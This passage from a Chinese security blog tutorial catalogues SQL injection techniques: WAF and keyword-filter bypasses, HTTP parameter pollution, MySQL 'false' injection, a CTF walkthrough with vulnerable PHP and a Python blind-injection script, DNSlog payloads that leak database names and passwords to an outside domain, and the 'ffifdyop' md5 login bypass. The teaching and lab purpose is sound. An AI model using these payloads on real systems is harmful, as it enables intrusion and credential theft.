href="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241600089.png" alt="img"></a></p><h3 id="过滤其他关键字绕过"><a href="#过滤其他关键字绕过" class="headerlink" title="过滤其他关键字绕过"></a>过滤其他关键字绕过</h3><p>过滤 if 语句绕过<br>如果过滤了 if 关键字的话，我们可以使用case when语句绕过：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(condition,1,0) &lt;=&gt; case when condition then 1 else 0 end</span><br></pre></td></tr></table></figure><p>下面的if语句和case when语句是等效的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; or if((ascii(substr((select database()),1,1))&gt;97),1,0)#</span><br><span class="line"></span><br><span class="line">0&#x27; or case when ascii(substr((select database()),1,1))&gt;97 then 1 else 0 end#</span><br></pre></td></tr></table></figure><h3 id="过滤-substr-绕过"><a href="#过滤-substr-绕过" class="headerlink" title="过滤 substr 绕过"></a>过滤 substr 绕过</h3><ul><li><p>使用 lpad&#x2F;lpad<br>使用lpad()和rpad()绕过substr()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select lpad((select database()),1,1)    // s</span><br><span class="line">select lpad((select database()),2,1)    // se</span><br><span class="line">select lpad((select database()),3,1)    // sec</span><br><span class="line">select lpad((select database()),4,1)    // secu</span><br><span class="line">select lpad((select database()),5,1)    // secur</span><br><span class="line">select lpad((select database()),6,1)    // securi</span><br><span class="line">select lpad((select database()),7,1)    // securit</span><br><span class="line">select lpad((select database()),8,1)    // security</span><br><span class="line"></span><br><span class="line">select rpad((select database()),1,1)    // s</span><br><span class="line">select rpad((select database()),2,1)    // se</span><br><span class="line">select rpad((select database()),3,1)    // sec</span><br><span class="line">select rpad((select database()),4,1)    // secu</span><br><span class="line">select rpad((select database()),5,1)    // secur</span><br><span class="line">select rpad((select database()),6,1)    // securi</span><br><span class="line">select rpad((select database()),7,1)    // securit</span><br><span class="line">select rpad((select database()),8,1)    // security</span><br></pre></td></tr></table></figure><p>lpad：函数语法：lpad(str1,length,str2)。其中str1是第一个字符串，length是结果字符串的长度，str2是一个填充字符串。如果str1的长度没有length那么长，则使用str2填充；如果str1的长度大于length，则截断。<br>rpad：同理</p></li><li><p>使用left()绕过substr()</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select left((select database()),1)    // s</span><br><span class="line">select left((select database()),2)    // se</span><br><span class="line">select left((select database()),3)    // sec</span><br><span class="line">select left((select database()),4)    // secu</span><br><span class="line">select left((select database()),5)    // secur</span><br><span class="line">select left((select database()),6)    // securi</span><br><span class="line">select left((select database()),7)    // securit</span><br><span class="line">select left((select database()),8)    // security</span><br></pre></td></tr></table></figure></li><li><p>使用mid()绕过substr()</p></li></ul><p>mid()函数的使用就和substr()函数一样了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select mid((select database()),1,1)    // s</span><br><span class="line">select mid((select database()),2,1)    // e</span><br><span class="line">select mid((select database()),3,1)    // c</span><br><span class="line">select mid((select database()),4,1)    // u</span><br><span class="line">select mid((select database()),5,1)    // r</span><br><span class="line">......</span><br></pre></td></tr></table></figure><ul><li><p>还可以使用下面这个神奇的东西绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select insert(insert((select database()),1,0,space(0)),2,222,space(0));    // s</span><br><span class="line">select insert(insert((select database()),1,1,space(0)),2,222,space(0));    // e</span><br><span class="line">select insert(insert((select database()),1,2,space(0)),2,222,space(0));    // c</span><br><span class="line">select insert(insert((select database()),1,3,space(0)),2,222,space(0));    // u</span><br><span class="line">select insert(insert((select database()),1,4,space(0)),2,222,space(0));    // r</span><br><span class="line">select insert(insert((select database()),1,5,space(0)),2,222,space(0));    // i</span><br><span class="line">select insert(insert((select database()),1,6,space(0)),2,222,space(0));    // t</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>INSERT( string , position , number , string2 )</p></li></ul><p>INSERT()函数在指定位置的字符串中插入一个字符串，并插入一定数量的字符。</p><h3 id="HTTP参数污染-HPP-漏洞绕过-Waf"><a href="#HTTP参数污染-HPP-漏洞绕过-Waf" class="headerlink" title="HTTP参数污染(HPP)漏洞绕过 Waf"></a>HTTP参数污染(HPP)漏洞绕过 Waf</h3><p>HPP是HTTP Parameter Pollution的缩写，意为HTTP参数污染。浏览器在跟服务器进行交互的过程中，浏览器往往会在GET或POST请求里面带上参数，这些参数会以 键-值 对的形势出现，通常在一个请求中，同样名称的参数只会出现一次。</p><p>但是在HTTP协议中是允许同样名称的参数出现多次的。比如下面这个链接：<a target="_blank" rel="noopener" href="http://www.baidu.com/?name=aa&name=bb%EF%BC%8C%E9%92%88%E5%AF%B9%E5%90%8C%E6%A0%B7%E5%90%8D%E7%A7%B0%E7%9A%84%E5%8F%82%E6%95%B0%E5%87%BA%E7%8E%B0%E5%A4%9A%E6%AC%A1%E7%9A%84%E6%83%85%E5%86%B5%EF%BC%8C%E4%B8%8D%E5%90%8C%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E4%BC%9A%E4%B8%8D%E4%B8%80%E6%A0%B7%E3%80%82%E6%9C%89%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%98%AF%E5%8F%96%E7%AC%AC%E4%B8%80%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF">http://www.baidu.com?name=aa&name=bb，针对同样名称的参数出现多次的情况，不同的服务器的处理方式会不一样。有的服务器是取第一个参数，也就是</a> name&#x3D;aa。有的服务器是取第二个参数，也就是 name&#x3D;bb。有的服务器两个参数都取，也就是 name&#x3D;aa,bb。这种特性在绕过一些服务器端的逻辑判断时，非常有用。</p><p>HPP漏洞，与Web服务器环境、服务端使用的脚本有关。如下是不同类型的Web服务器对于出现多个参数时的选择：</p><table><thead><tr><th>表头Web 服务器</th><th>参数获取函数</th><th>获取到的参数</th></tr></thead><tbody><tr><td>PHP&#x2F;Apache</td><td>$_GET[‘a’]</td><td>Last</td></tr><tr><td>JSP&#x2F;Tomcat</td><td>Request.getParameter(‘a’)</td><td>First</td></tr><tr><td>Perl(CGI)&#x2F;Apache</td><td>Param(‘a’)</td><td>First</td></tr><tr><td>Python&#x2F;Apache</td><td>getvalue(‘a’)</td><td>All</td></tr><tr><td>ASP&#x2F;IIS</td><td>Request.QueryString(‘a’)</td><td>All</td></tr></tbody></table><p>假设服务器端有两个部分：第一部分是Tomcat为引擎的JSP&#x2F;Tomcat型服务器，第二部分是Apache为引擎的PHP&#x2F;Apache型服务器。第一部分的JSP&#x2F;Tomcat服务器处做数据过滤和处理，功能类似为一个WAF，而真正提供Web服务的是PHP&#x2F;Apache服务器。那么服务端的工作流程为：客户端访问服务器，能直接访问到JSP&#x2F;Tomcat服务器，然后JSP&#x2F;Tomcat服务器再向PHP&#x2F;Apache服务器请求数据。数据返回路径则相反。</p><p>那么此时我们便可以利用不同服务器解析参数的位置不同绕过WAF的检测。来看看如下请求：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index.jsp?id=1&amp;id=2</span><br></pre></td></tr></table></figure><p>客户端请求首先过JSP&#x2F;Tomcat服务器，JSP&#x2F;Tomcat服务器解析第一个参数，接下来JSP&#x2F;Tomcat服务器去请求PHP&#x2F;Apache服务器，PHP&#x2F;Apache服务器解析最后一个参数。假设JSP&#x2F;Tomcat服务器作为Waf对第一个参数进行检测，那我们便可以在第二个参数中传payload来绕过Waf。如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/index.jsp?id=1&amp;id=-1&#x27; union select 1,database(),3--+</span><br></pre></td></tr></table></figure><p>这样 Waf 可能只检测第一个参数 id&#x3D;1，而PHP脚本真正识别的是 id&#x3D;select database()–+<br>[例题]Sql-Labs Less-29</p><h3 id="False-注入绕过"><a href="#False-注入绕过" class="headerlink" title="False 注入绕过"></a>False 注入绕过</h3><p><strong>False 注入原理</strong><br>前面我们学过的注入都是基于1&#x3D;1这样比较的普通注入，下面来说一说 False 注入，利用 False 我们可以绕过一些特定的 WAF 以及一些未来不确定的因素。</p><p>首先我们来看一看下面这个sql查询语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where uesrname = 0;</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241610227.png" alt="img"></a></p><p>为什么 username &#x3D; 0 会导致返回数据，而且是全部数据呢？</p><p>这就是一个基于 False 注入的例子，下面再举一个例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username = 0;</span><br></pre></td></tr></table></figure><p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241611666.png" alt="img"></a></p><p>和上面是同一个表，但是为什么这里只返回了两组数据呢？说到这里不得不说一说有关于 MYSQL 的隐式类型转换。</p><p>MYSQL 的隐式类型转换，即当字符串和数字比较时，会把字符串转为浮点数，而字符串转换为浮点数很明显会转换失败，这时就会产生一个warning，转换的结果为0，然后0 &#x3D; 0 返回的是 True ，这样就将表中的数据全部返回了。但如果字符串开头是数字话还是会从数字部分截断，转换为数字进行比较，在第二个例子中，passwd 字段中有一个值是以数字1开头的并非为0，再进行 passwd &#x3D; 0 比较时，会从1开始截断，1 &#x3D; 0 不成立，当然就只返回两条数据了。这就是 MYSQL False 注入的原理。</p><p><strong>False 注入利用</strong><br>下面我们讲讲 False 注入如何利用，及如何构造 False 注入的利用点。在实际中我们接触到的语句都是带有引号的，如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from user where username =&#x27;.$username.&#x27;;</span><br></pre></td></tr></table></figure><p>在这种情况下，我们如何绕过引号构造出 0 这个值呢，我们需要做一些处理来构造false注入的利用点？</p><p>可以使用的姿势有很多，比如下面的算数运算：</p><ul><li><p>利用算数运算</p><p>加：+</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;+&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;+&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>减：-</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;-&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;-&#x27;&#x27;;</span><br></pre></td></tr></table></figure></li></ul><p>乘：*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;*&#x27;, 拼接的语句: select * from user where username =&#x27;&#x27;*&#x27;&#x27;;</span><br></pre></td></tr></table></figure><p>除：&#x2F;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;/6#, 拼接的语句: select * from user where username =&#x27;&#x27;/6#&#x27;;</span><br></pre></td></tr></table></figure><p>取余：%</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;%1#, 拼接的语句: select * from user where username =&#x27;&#x27;%1#&#x27;;</span><br></pre></td></tr></table></figure><ul><li><p>利用位操作运算</p><p>我们还可以使用当字符串和数字运算的时候类型转换的问题进行利用。</p><p>和运算：&amp;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;&amp;0#, 拼接的语句: select * from user where username =&#x27;&#x27;&amp;0#&#x27;;</span><br></pre></td></tr></table></figure></li></ul><p>或运算：|</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;|0#, 拼接的语句: select * from user where username =&#x27;&#x27;|0#&#x27;;</span><br></pre></td></tr></table></figure><p>异或运算：^</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;^0#, 拼接的语句: select * from user where username =&#x27;&#x27;^0#&#x27;;</span><br></pre></td></tr></table></figure><p>移位操作：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">插入&#x27;&lt;&lt;0# 或 &#x27;&gt;&gt;0#, 拼接的语句: </span><br><span class="line">select * from user where username =&#x27;&#x27;&lt;&lt;0#&#x27;;</span><br><span class="line">select * from user where username =&#x27;&#x27;&gt;&gt;0#&#x27;;  </span><br></pre></td></tr></table></figure><ul><li><p>利用比较运算符</p><p>安全等于：&lt;&#x3D;&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;=0&lt;=&gt;1# 拼接的语句：where username=&#x27;&#x27;=0&lt;=&gt;1#&#x27;</span><br></pre></td></tr></table></figure></li></ul><p>不等于&lt;&gt;(!&#x3D;)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;=0&lt;&gt;0# 拼接的语句：where username=&#x27;&#x27;=0&lt;&gt;0#&#x27;</span><br></pre></td></tr></table></figure><p>大小于&gt;或&lt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&gt;-1# 拼接的语句：where username=&#x27;&#x27;&gt;-1#</span><br></pre></td></tr></table></figure><ul><li><p>其他</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+1 is not null#  &#x27;in(-1,1)#  &#x27;not in(1,0)#  &#x27;like 1#  &#x27;REGEXP 1#  &#x27;BETWEEN 1 AND 1#  &#x27;div 1#  &#x27;xor 1#  &#x27;=round(0,1)=&#x27;1  &#x27;&lt;&gt;ifnull(1,2)=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>综合利用<br>false注入这种注入方式有的优势就是，在某些特定时候可以绕过WAF或者是一些其他的绕过。</p></li></ul><p>这里举例一道题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">include(&quot;config.php&quot;);  </span><br><span class="line">$conn -&gt;query(&quot;set names utf8&quot;);  </span><br><span class="line"></span><br><span class="line">function randStr($lenth=32)&#123;</span><br><span class="line">     $strBase = &quot;1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm&quot;;</span><br><span class="line">     $str = &quot;&quot;;</span><br><span class="line">     while($lenth&gt;0)&#123;</span><br><span class="line">       $str.=substr($strBase,rand(0,strlen($strBase)-1),1);</span><br><span class="line">       $lenth --;</span><br><span class="line">     &#125;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">if($install)&#123;</span><br><span class="line">     $sql = &quot;create table `user` (          `id` int(10) unsigned NOT NULL PRIMARY KEY  AUTO_INCREMENT ,          `username` varchar(30) NOT NULL,          `passwd` varchar(32) NOT NULL,          `role` varchar(30) NOT NULL        )ENGINE=MyISAM AUTO_INCREMENT=1 DEFAULT CHARSET=latin1 COLLATE=latin1_general_ci &quot;;</span><br><span class="line">     if($conn-&gt;query($sql))&#123;</span><br><span class="line">        $sql  = &quot;insert into `user`(`username`,`passwd`,`role`) values (&#x27;admin&#x27;,&#x27;&quot;.md5(randStr()).&quot;&#x27;,&#x27;admin&#x27;)&quot;;</span><br><span class="line">        $conn -&gt; query($sql);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function filter($str)&#123;</span><br><span class="line">      $filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br><span class="line">      if(preg_match($filter,$str))&#123;</span><br><span class="line">          die(&quot;you can&#x27;t input this illegal char!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;   </span><br><span class="line"></span><br><span class="line">function show($username)&#123;</span><br><span class="line">   global $conn;</span><br><span class="line">   $sql = &quot;select role from `user` where username =&#x27;&quot;.$username.&quot;&#x27;&quot;;</span><br><span class="line">   $res = $conn -&gt;query($sql);</span><br><span class="line">   if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        echo &quot;$username is &quot;.$res-&gt;fetch_assoc()[&#x27;role&#x27;];</span><br><span class="line">   &#125;else&#123;</span><br><span class="line">        die(&quot;Don&#x27;t have this user!&quot;);</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;  </span><br><span class="line"></span><br><span class="line">function login($username,$passwd)&#123;</span><br><span class="line">     global $conn;</span><br><span class="line">     global $flag;</span><br><span class="line">     $username = trim(strtolower($username));</span><br><span class="line">     $passwd = trim(strtolower($passwd));</span><br><span class="line">     if($username == &#x27;admin&#x27;)&#123;</span><br><span class="line">         die(&quot;you can&#x27;t login this as admin!&quot;);</span><br><span class="line">     &#125;  </span><br><span class="line">     $sql = &quot;select * from `user` where username=&#x27;&quot;.$conn-&gt;escape_string($username).&quot;&#x27; and passwd=&#x27;&quot;.$conn-&gt;escape_string($passwd).&quot;&#x27;&quot;;</span><br><span class="line">     $res = $conn -&gt;query($sql);</span><br><span class="line">     if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">           if($res-&gt;fetch_assoc()[&#x27;role&#x27;] === &#x27;admin&#x27;) exit($flag);</span><br><span class="line">     &#125;else&#123; </span><br><span class="line">           echo &quot;sorry,username or passwd error!&quot;;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line">  function source()&#123;</span><br><span class="line">      highlight_file(__FILE__);</span><br><span class="line"> &#125;</span><br><span class="line">  $username = isset($_POST[&#x27;username&#x27;])?filter($_POST[&#x27;username&#x27;]):&quot;&quot;;</span><br><span class="line">  $passwd = isset($_POST[&#x27;passwd&#x27;])?filter($_POST[&#x27;passwd&#x27;]):&quot;&quot;;</span><br><span class="line">  $action = isset($_GET[&#x27;action&#x27;])?filter($_GET[&#x27;action&#x27;]):&quot;source&quot;;</span><br><span class="line"></span><br><span class="line">switch($action)&#123;</span><br><span class="line">    case &quot;source&quot;: source(); break ;</span><br><span class="line">    case &quot;login&quot; : login($username,$passwd);break;</span><br><span class="line">    case &quot;show&quot; : show($username);break; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们注意到filter()函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$filter = &quot;/ |*|#|;|,|is|union|like|regexp|for|and|or|file|--|||`|&amp;|&quot;.urldecode(&#x27;%09&#x27;).&quot;|&quot;.urldecode(&quot;%0a&quot;).&quot;|&quot;.urldecode(&quot;%0b&quot;).&quot;|&quot;.urldecode(&#x27;%0c&#x27;).&quot;|&quot;.urldecode(&#x27;%0d&#x27;).&quot;|&quot;.urldecode(&#x27;%a0&#x27;).&quot;/i&quot;;</span><br></pre></td></tr></table></figure><p>这里看起来过滤的比较多，其中and，or还有&amp;，|都被过滤了，这个时候就可以利用false进行盲注。</p><p>可以在show函数利用查询的时候注入，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username = &quot;admin&#x27;^!(mid((passwd)from(-&#123;pos&#125;))=&#x27;&#123;passwd&#125;&#x27;)=&#x27;1&quot;</span><br></pre></td></tr></table></figure><p>这里官方给出的就是利用异或，其实这里并不需要 admin 只要是一串字符串就可以</p><p>异或会使字符串都转为浮点型，都变为了0，由于0&#x3D;0^0 -&gt; 1^0 -&gt; 1 当然对于这个题并不一定利用这个，直接截取字符串作比较就可以，但是这里只是提供一种姿势，由于mysql的灵活，其花样也比较多还有就是构造的payload比较简短，例如’+’、’^’、’&#x2F;4#’ 这样只有三个字符便可以绕过登录，简单粗暴，还有就是类似的文章不多，许多开发人员容易忽视这些细节。</p><p><strong>盲注脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for i in range(1,33):</span><br><span class="line">    for str in &quot;abcdefghijklmnopkrstuvwxyz&quot;:</span><br><span class="line">        url = &quot;http://cc248a80-6376-49cf-b846-16c188eeb1fc.node3.buuoj.cn/Less-8/?id=&#x27;^(mid((select database())from(-&#123;0&#125;))=&#x27;&#123;1&#125;&#x27;)=&#x27;1&quot;.format(i,str+flag)</span><br><span class="line">        res = requests.get(url=url)</span><br><span class="line">        if &quot;You are in...........&quot; in res.text:</span><br><span class="line">            flag = str+flag</span><br><span class="line">            print(flag)</span><br></pre></td></tr></table></figure><h3 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h3><p><strong>原理</strong><br>通过子查询，将内容拼接到域名内，让load_file()去访问共享文件，访问的域名被记录此时变为显错注入,将盲注变显错注入,读取远程共享文件，通过拼接出函数做查询,拼接到域名中，访问时将访问服务器，记录后查看日志。</p><p>在无法直接利用的情况下，但是可以通过DNS请求,通过DNSlog，把数据外带，用DNS解析记录查看。</p><p>LOAD_FILE() 读取文件的函数<br>读取文件并返回文件内容为字符串。</p><p>要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。该文件所有字节可读，但文件内容必须小于max_allowed_packet（限制server接受的数据包大小函数，默认1MB）。 如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p><p>注：这个功能不是默认开启的，需要在mysql配置文件加一句 secure_file_priv&#x3D;</p><p><strong>DNSLOG平台</strong>:<br><a target="_blank" rel="noopener" href="https://dns.咕.com/">https://dns.xn--9tr.com/</a></p><p><a target="_blank" rel="noopener" href="https://log.咕.com/">https://log.xn--9tr.com/</a></p><p><strong>UNC路径</strong><br>UNC路径通用命名规则，也称通用命名规范、通用命名约定，类似\softer这样的形式的网络路径。</p><p>UNC路径的 格式 ：\server\sharename\directory\filename</p><p>等同于SELECT LOAD_FILE(‘&#x2F;&#x2F;库名.1806dl.dnslog.cn&#x2F;abc’</p><p>去访问 库名.1806dl.dnslog.cn 的服务器下的共享文件夹abc。</p><p>然后1806dl.dnslog.cn的子域名的解析都是在某台服务器，然后他记录下来了有人请求访问了error.1806dl.dnslog.cn，然后在DnsLog这个平台上面显示出来了</p><p>payload示例：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, database(),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;, (select table_name from information_schema.tables where table_schema=database() limit 0,1 ),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select column_name from information_schema.columns where table_name=’admin’ and table_schema=database() limit 2,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br><span class="line">?id=1 and load_file(concat(&#x27;//&#x27;,(select password from admin limit 0,1),&#x27;.htleyd.dnslog.cn/abc&#x27;))</span><br></pre></td></tr></table></figure><h3 id="‘“-md5-pass-true-”‘-登录绕过"><a href="#‘“-md5-pass-true-”‘-登录绕过" class="headerlink" title="‘“.md5($pass,true).”‘ 登录绕过"></a>‘“.md5($pass,true).”‘ 登录绕过</h3><p>很多站点为了安全都会利用这样的语句：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;.md5($password,true).&#x27;;</span><br></pre></td></tr></table></figure><p>md5(string,true) 函数在指定了true的时候，是返回的原始 16 字符二进制格式，也就是说会返回这样子的字符串：’or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c：<br><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/loading.gif" data-original="https://raw.githubusercontent.com/chencicici/images/main/202206241621318.png" alt="img"></a></p><p>这不是普通的二进制字符串，而是 ‘or’6\xc9]\x99\xe9!r,\xf9\xedb\x1c 这种，这样的话就会和前面的形成闭合，构成万能密码。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM users WHERE password = &#x27;&#x27;or&#x27;6.......&#x27;</span><br></pre></td></tr></table></figure><p>但是我们思考一下为什么 6\xc9]\x99\xe9!r,\xf9\xedb\x1c 的布尔值是true呢？</p><p>在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数（这类似于PHP的弱类型）。要注意的是这种情况是必须要有单引号括起来的，比如 password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于 password&#x3D;‘xxx’ or true，所以返回值就是true。这里不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如 password&#x3D;‘xxx’ or 1，那么返回值也是 true。（xxx指代任意字符）</p><p>接下来就是找到这样子的字符串，这里给出两个吧。</p><p>ffifdyop：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: &#x27;or&#x27;6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: &#x27;or&#x27;6]!r,b</span><br></pre></td></tr></table></figure><p>129581926211651571912466741651878684928：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">content: 129581926211651571912466741651878684928</span><br><span class="line">hex: 06da5430449f8f6f23dfc1276f722738</span><br><span class="line">raw: \x06\xdaT0D\x9f\x8fo#\xdf\xc1&#x27;or&#x27;8</span><br><span class="line">string: T0Do#&#x27;or&#x27;8</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.fannn.xyz">Fannn</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.fannn.xyz/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/">https://www.fannn.xyz/2024/12/03/sql%E6%B3%A8%E5%85%A5%E7%9A%84%E5%B8%B8%E8%A7%81%E5%A7%BF%E5%8A%BF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.fannn.xyz" target="_blank">Fannnの挖掘小屋</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/avatar.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload='this.media="all"'><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/12/04/%E7%BA%A2%E9%98%9F%E6%89%93%E7%82%B9%E5%B0%8F%E6%8A%80%E5%B7%A7/" title="红队打点小技巧"><div class="cover" style="background:var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">红队打点小技巧</div></div></a></div><div class="next-post pull-right"><a href="/2024/12/02/2024%E5%B9%B412%E6%9C%88%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%91%A8%E6%8A%A5/" title="2024年12月第一次周报"><div class="cover" style="background:var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">2024年12月第一次周报</div></div></a></div></nav><hr class="custom-hr"><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="giscus-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81SQL%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">一、SQL注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E8%B4%A6%E5%8F%B7%E5%AD%98%E5%9C%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">二、账号存在注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%85%B6%E4%BB%96"><span class="toc-number">3.</span> <span class="toc-text">三、其他</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number"></span> <span class="toc-text">攻击方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 